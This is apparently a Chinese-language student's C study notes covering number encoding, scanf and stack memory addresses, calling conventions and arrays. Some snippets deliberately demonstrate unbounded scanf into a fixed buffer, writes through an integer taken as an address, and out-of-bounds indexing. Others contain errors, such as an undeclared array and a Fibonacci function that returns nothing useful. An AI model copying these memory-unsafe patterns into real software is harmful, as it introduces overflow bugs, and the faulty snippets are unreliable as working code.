class="comment">// 1000 0000</span></span><br><span class="line"><span class="comment">// 1 0000000</span></span><br><span class="line"><span class="comment">// - 1111111 + 1 </span></span><br><span class="line"><span class="comment">// - 1000 0000</span></span><br><span class="line"><span class="comment">// - 8    0</span></span><br><span class="line"><span class="comment">// - 8*16</span></span><br><span class="line"><span class="comment">// -128</span></span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/02.png" class title="This is an example image">

<p>PS：这是在winHex里面的表现形式，十六进制表示，其余程序不一定是这样<br>        十进制整数在winHex的表示，直接把十进制转化为十六进制，小端排序即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制中，大于等于8的都是负数 </span><br><span class="line">1000 因为存储的都是补码形式</span><br><span class="line"></span><br><span class="line">看首位是否&lt;8,＜8说明是正数，≥8说明是负数。</span><br><span class="line">原理:临界值为7fffH，我们知道首位7的二进制码为0111，而0111的首位是0，说明是正数。而像8000H首位8二进制码为1000，首位为1，就变成负数了。</span><br></pre></td></tr></table></figure>



<h3 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h3><p>二进制存储小数原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、固定分解</span><br><span class="line">二进制0.1表示为十进制的0.5，0.01表示为0.25，0.001表示为0.125</span><br><span class="line">因此，十进制的小数转化为二进制如下：</span><br><span class="line">0.375 &lt; 0.5   =&gt; 0</span><br><span class="line">0.375 &gt; 0.25  =&gt; 1</span><br><span class="line">0.125 = 0.125 =&gt; 1</span><br><span class="line">因此 0.375(十进制) = 0.011(二进制)</span><br><span class="line"></span><br><span class="line">2、乘2取余</span><br><span class="line">乘2如果小于1说明原值小于0.5，即取0</span><br><span class="line">0.375 * 2 = 0.75 &lt; 1 =&gt; 0</span><br><span class="line">0.75 * 2 = 1.5 &gt; 1   =&gt; 1</span><br><span class="line">0.5 * 2 = 1 == 1     =&gt; 1</span><br><span class="line">因此 0.375(十进制) = 0.011(二进制)</span><br><span class="line"></span><br><span class="line">0.6就没法精确</span><br><span class="line"></span><br><span class="line">实际存储</span><br><span class="line">总共4个字节32位，1个字节8位即一个十六进制</span><br><span class="line">一位放正负符号、一个字节(8位)放小数点位置，其余23位放值。注：64位有11位表小数点位置</span><br><span class="line">32位 = 1 + 8 + 23</span><br><span class="line">32位4个字节，小数形式十六进制存储形式如下：</span><br><span class="line">S EEEEEEEE DDDDDDDDDDDDDDDDDDDDDDD</span><br><span class="line"></span><br><span class="line">案例计算：</span><br><span class="line">23.625（十进制）</span><br><span class="line">=&gt; 10111.101（二进制） 有小数转十六进制的形式</span><br><span class="line">=&gt; 1.0111101 * 10^4</span><br><span class="line">S(正负符号位) EEEEEEEE(小数点位) DDDDDDDDDDDDDDDDDDDDDDD(值,补0)</span><br><span class="line">	小数点位存储8位，大小为，0-127-255，转化为 -128-0-127</span><br><span class="line">	即原来0-4-|127|-255变成-128-|0|-4-127</span><br><span class="line">	原先0-255表示4是 00000100</span><br><span class="line">	而后-128-127表示4是 4+127 = 128+3 = 10000011</span><br><span class="line">=&gt;0           10000011          01111010000000000000000</span><br><span class="line">=&gt;01000001101111010000000000000000</span><br><span class="line">=&gt;0100 0001 1011 1101 0000 0000 0000 0000</span><br><span class="line">=&gt;4    1    B    D    0    0    0    0</span><br><span class="line">=&gt;00 00 BD 41</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目1：</span><br><span class="line">将895.75转换为float类型的16进制形式，895 = 1101111111(B)</span><br><span class="line">1101111111.11</span><br><span class="line">1.10111111111 * 10^9</span><br><span class="line">	9+127 =&gt; 128+8 =&gt; 10001000</span><br><span class="line">0 10001000 10111111111000000000000</span><br><span class="line">0100 0100 0101 1111 1111 0000 0000 0000</span><br><span class="line">4    4    5    F    F    0    0    0</span><br><span class="line">00 F0 5F 44</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目2：</span><br><span class="line">已知地址0013FF74内容为：00 68 45 44，系统字节顺序为小尾方式，如果这个地址是存放flaot变量，那么其10进制真值为多少？</span><br><span class="line">44 45 68 00</span><br><span class="line">0100 0100 0100 0101 0110 1000 0000 0000 </span><br><span class="line">0 10001000 10001010110100000000000 </span><br><span class="line">1 10^9</span><br><span class="line">+1.100010101101 * 10^9</span><br><span class="line">+1100010101.101</span><br><span class="line">+2^9 + 2^8 + 2^4 + 2^2 + 1 + 0.5 + 0.125 </span><br><span class="line">+512+256+16+4+1+0.5+0.125</span><br><span class="line">+789.625</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">float</span> f = <span class="number">23.625f</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\r\n&quot;</span>,&amp;f);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="关于字节问题"><a href="#关于字节问题" class="headerlink" title="关于字节问题"></a>关于字节问题</h3><p>4个字节，一个字节8位，每8位相当于一个十六进制 0000 0000</p>
<p>winHex是双字节存储，每个地址对应的是两个十六进制数</p>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><p>VC98&#x2F;CRT&#x2F;SRC&#x2F;RAND.C</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">// 测试程序什么时候退出</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">while</span>(n&lt;<span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x\r\n&quot;</span>,rand()); <span class="comment">//移除括号外，开销大，printf开销大</span></span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run.bat</span></span><br><span class="line">del *.obj</span><br><span class="line">del *.exe</span><br><span class="line">cl /c /W4 /WX 2.c</span><br><span class="line"><span class="built_in">link</span> 2.obj</span><br><span class="line">2.exe</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<h1 id="C语言基础语法分析"><a href="#C语言基础语法分析" class="headerlink" title="C语言基础语法分析"></a>C语言基础语法分析</h1><h2 id="1、数值和字符串"><a href="#1、数值和字符串" class="headerlink" title="1、数值和字符串"></a>1、数值和字符串</h2><p>‘a’表示为ASCLL，输入到变量地址要&amp;n，输入指定地址直接n</p>
<p>“a”表示为字符串，默认取首地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">char</span> szBuf[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;   <span class="comment">//vc6.0默认在19ff2c地址开始存储</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,szBuf);  <span class="comment">//scanf存在越界情况</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19s&quot;,szBuf); 这个19也可以改，如果有条件</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19[0-9]s&quot;,szBuf);</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19[0,5,9,a]s&quot;,szBuf);</span></span><br><span class="line">    <span class="comment">//scanf(&quot;%19[^8]s&quot;,szBuf);</span></span><br><span class="line">    <span class="comment">// 输入12341234123412341234000</span></span><br><span class="line">    <span class="comment">// 此处是以字符串的形式输入，0=&gt;30,1=&gt;31,2=&gt;32,3=&gt;33,4=&gt;34</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/03.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment">//2、输入整数，内存存储的地址</span></span><br><span class="line">    <span class="type">int</span> n; <span class="comment">//未初始化，残留值地址</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,n); </span><br><span class="line">    <span class="comment">//地址默认在19ff2c开始存储，但此处存储的是一个地址，残留的地址，要根据地址去跳转</span></span><br><span class="line">    <span class="comment">/*2.1、 初始化位0，0是保留地址，可以去winxp看详细报错</span></span><br><span class="line"><span class="comment">            int n = 0; 会报错，</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,n);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*2.2、 定义短字节整形，%d输入，造成覆盖</span></span><br><span class="line"><span class="comment">            short int ary[2] = &#123;666,999&#125;;   定义数组时，即把值放在19ff2c里</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,&amp;ary[0]);      此处指定存储地址为数组的第一个值地址</span></span><br><span class="line"><span class="comment">            此处把666和999放到固定的19ff20那一行，&quot;%hd&quot;</span></span><br><span class="line"><span class="comment">            输入999，理论上是修改666的值，但4字节输入，2字节存储，导致后面覆盖成0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/04.png" class title="This is an example image">

<p>C0000005内存访问异常</p>
<p>scanf怎么判断指定输入的是地址还是值，默认都是存储在19ff20这一行</p>
<p>结论：</p>
<p><strong>scanf后续指定的就是地址</strong></p>
<ol>
<li>有初始化值，默认存储在19ff2c，后续的输入是覆盖变量值(整数、字符等)</li>
<li>无初始化值，取残留值，即默认地址存储的是残留地址，残留地址存储的才是值</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0x19ff2c</span>;  <span class="comment">// 此处存储地址默认在19ff28</span></span><br><span class="line">    <span class="type">int</span> m = <span class="number">0</span>;	       <span class="comment">// 此处存储地址默认在19ff2c</span></span><br><span class="line">    <span class="comment">// printf(&quot;%p:%d&quot;,&amp;n,n);   0019FF28:1703724</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,n); <span class="comment">// 输入999，此处把99输入到n对应的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\r\n&quot;</span>,n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\r\n&quot;</span>,m);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*结果</span></span><br><span class="line"><span class="comment">999</span></span><br><span class="line"><span class="comment">0019ff2c</span></span><br><span class="line"><span class="comment">000003e7</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>不同于printf，默认变量定义或从scanf获取值时，就已经开辟内存</p>
<p>m &#x3D; 0x19ff2c时，是存储在19ff28</p>
<img src="/2024/01/02/Notes-C/05.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;	</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0x19ff2c</span>;</span><br><span class="line">	<span class="type">int</span> m = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;n address:%p\r\n&quot;</span>,&amp;n); <span class="comment">//打印内存地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;m address:%p\r\n&quot;</span>,&amp;m); <span class="comment">//打印内存地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;i address:%p\r\n&quot;</span>,&amp;i); <span class="comment">//打印内存地址</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	n address:0019FF24</span></span><br><span class="line"><span class="comment">    m address:0019FF28</span></span><br><span class="line"><span class="comment">    i address:0019FF2C</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>结论：</p>
<ol>
<li>vc++中变量存储地址从19ff2c开始</li>
<li>但是有多个变量，地址是往前排，比如有两个变量，第一个变量地址是 19ff28 ，第二个是19ff2c</li>
</ol>
<h2 id="2、新建C项目-新建-amp-调试"><a href="#2、新建C项目-新建-amp-调试" class="headerlink" title="2、新建C项目(新建&amp;调试)"></a>2、新建C项目(新建&amp;调试)</h2><p>新建MFC项目控制台项目（基于 Microsoft 基础类 (MFC) 库的 Windows 可执行应用程序）</p>
<p>create -&gt; Win32 Console Application-&gt;Helloworld</p>
<p>快捷键（F5、Ctrl+F7、F9、F10、F11），反汇编</p>
<p>F5：编译、链接、调试、运行</p>
<p>Ctrl+F7：编译不链接</p>
<p>F7：编译、链接</p>
<p>F9：打断点</p>
<p>F10：执行下一步，跳过循环或函数</p>
<p>F11：执行下一步，进入循环或函数</p>
<p>CTRL+F10：运行到光标所在行</p>
<p>Disassembly：反编译</p>
<p>Alt+8跳转汇编，对应代码和汇编</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">7</span>; x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">7</span>; y++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x + <span class="number">3</span> == y || -x + <span class="number">9</span> == y || x - <span class="number">3</span> == y || -x + <span class="number">4</span> == y)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;* &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>配调试界面（十六进制窗口、变量窗口、栈窗口、寄存器）</p>
<p>View -&gt; Debug Windows -&gt;Memory</p>
<p>View -&gt; Debug Windows -&gt;Watch</p>
<p>View -&gt; Debug Windows -&gt;Call Stack</p>
<p>View -&gt; Debug Windows -&gt;Register</p>
<img src="/2024/01/02/Notes-C/06.png" class title="This is an example image">

<h2 id="3、循环-amp-goto-amp-基本代码"><a href="#3、循环-amp-goto-amp-基本代码" class="headerlink" title="3、循环&amp;goto&amp;基本代码"></a>3、循环&amp;goto&amp;基本代码</h2><p>double 8字节、int 4字节，double类型数据按int输出会丢失字节，取值（ceil、floor）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">15000</span>;</span><br><span class="line">    <span class="type">double</span> dblBitCount = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dblBitCount = dblBitCount + <span class="built_in">log10</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> NEXT;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">NEXT:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>,(<span class="type">int</span>)<span class="built_in">ceil</span>(dblBitCount));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4、函数调用-调用机制"><a href="#4、函数调用-调用机制" class="headerlink" title="4、函数调用 (调用机制)"></a>4、函数调用 (调用机制)</h2><p><strong>1，按调用约定传递参数。</strong></p>
<p>1.1调用约定调用方（caller）需要和被调方（callee）作出以下约定：</p>
<ol>
<li>参数的传递方向</li>
<li>参数的传输媒介</li>
<li>函数返回值的位置</li>
<li>释放参数空间的负责方，有且仅有一方去释放参数空间。</li>
</ol>
<p>__cdecl：参数使用栈空间传递，从右往左函数返回值在寄存器，由调用方负责释放参数空间</p>
<p>__stdcall：参数使用栈空间传递，从右往左函数返回值在寄存器，由被调方负责释放参数空间</p>
<p>__fastcall：左数前两个参数使用寄存器传递，其它参数使用栈空间传递，从右往左函数返回值在寄存器，由被调方负责释放参数空间</p>
<p><strong>2.保存返回地址，函数调用结束后应该执行的地址值</strong></p>
<p><strong>3.保存调用方的信息(栈底)</strong></p>
<p><strong>4.更新当前栈到栈顶（把当前栈顶作为被调方的栈底）</strong></p>
<p><strong>5.为局部变量申请空间。（抬高栈顶)</strong></p>
<p><strong>6.保存寄存器环境。（把即将使用的寄存器原值保存在栈里)</strong></p>
<p><strong>7.如果编译选项有&#x2F;zI&#x2F;Zi，则将局部变量初始化为oxcccccccc</strong></p>
<p><strong>8.执行函数体</strong></p>
<p><strong>9.恢复寄存器环境</strong></p>
<p><strong>10.释放局部变量的空间</strong></p>
<p><strong>11.恢复调用方的栈信息(栈底)</strong></p>
<p>从右向左填充</p>
<p><strong>对于栈来说，数据出入的口是栈顶。</strong></p>
<img src="/2024/01/02/Notes-C/08.png" class title="This is an example image">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">GetFib</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nF1 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> nF2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> nFib = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">2</span> || n == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nFib;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nFib1 = GetFib(<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nFib2 = GetFib(<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">47</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        nFib1 = GetFib(<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02d:%15u\t%f\r\n&quot;</span>, i<span class="number">-2</span>, nFib1, (<span class="type">double</span>)nFib2 / nFib1);</span><br><span class="line">        nFib2 = nFib1;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-C/07.png" class title="This is an example image">

<img src="/2024/01/02/Notes-C/09.png" class title="This is an example image">

<img src="/2024/01/02/Notes-C/10.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.调用者在自己的栈帧里开辟好被调函数形参需要的空间</span><br><span class="line"></span><br><span class="line">2.入栈 函数调用结束后应该执行的地址值，即返回地址，其实就是回收第一步为形参开辟的空间的指令的地址</span><br><span class="line"></span><br><span class="line">3.进入被调函数了，入栈调用函数栈帧的栈底地址</span><br><span class="line"></span><br><span class="line">4.在新函数的当前栈帧内为局部变量分配空间后，入栈局部变量</span><br><span class="line"></span><br><span class="line">5.被调函数遇到return语句了，说明即将结束本函数了，就开始做回收本栈帧的空间的事了：</span><br><span class="line"></span><br><span class="line">      1）如果有返回值，那么把返回值赋值给EAX，如果没有则忽略这一步。</span><br><span class="line"></span><br><span class="line">      2）回收局部变量空间，即esp指向调用函数栈帧的栈顶了</span><br><span class="line"></span><br><span class="line">      3）提前存好的main函数栈帧的栈底地址赋值进入ebp寄存器，从而使得ebp指向main函数栈帧的栈底</span><br><span class="line"></span><br><span class="line">      4）把返回地址填入EIP寄存器，接着就会指向，回收main函数当初为被调函数开辟的两个形参的空间的指令地址</span><br><span class="line"></span><br><span class="line">      5）回收形参空间</span><br><span class="line">————————————————</span><br><span class="line">原文链接：https://blog.csdn.net/kangkanglhb88008/article/details/89739105</span><br></pre></td></tr></table></figure>

<h2 id="5、数组"><a href="#5、数组" class="headerlink" title="5、数组"></a>5、数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n = ...;</span><br><span class="line">type ary[M] = ...;</span><br><span class="line">ary[n] address:</span><br><span class="line">	(<span class="type">int</span>)ary + <span class="keyword">sizeof</span>(type)*n = <span class="number">0x00400000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,&amp;p[<span class="number">20</span>]);</span><br></pre></td></tr></table></figure>

<p>没有限制数组访问，默认可以任意访问</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">-1</span>],&amp;arr[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">0</span>],&amp;arr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">1</span>],&amp;arr[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">2</span>],&amp;arr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d-%p&quot;</span>,arr[<span class="number">3</span>],&amp;arr[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用越界，访问指定地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0019ff2c</span></span><br><span class="line">求出<span class="number">0x00400000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>,ary[(<span class="number">0x00400000</span> - (<span class="type">int</span>)ary) / <span class="keyword">sizeof</span>(<span class="type">int</span>)]);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>间接访问，[] * -&gt;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> temp = n;</span><br><span class="line">	n = m;</span><br><span class="line">	m = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">1</span>,m = <span class="number">2</span>;</span><br><span class="line">	change(n,m);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> arr[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> temp = arr[<span class="number">0</span>];</span><br><span class="line">	arr[<span class="number">0</span>] = arr[<span class="number">1</span>];</span><br><span class="line">	arr[<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">	change(arr);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>内存结构示例图</p>
<img src="/2024/01/02/Notes-C/10.png" class title="This is an example image">

<p>两个BUG(Build-clean)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 查看mainCRTStartup()源码</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">float</span> f;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;f);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

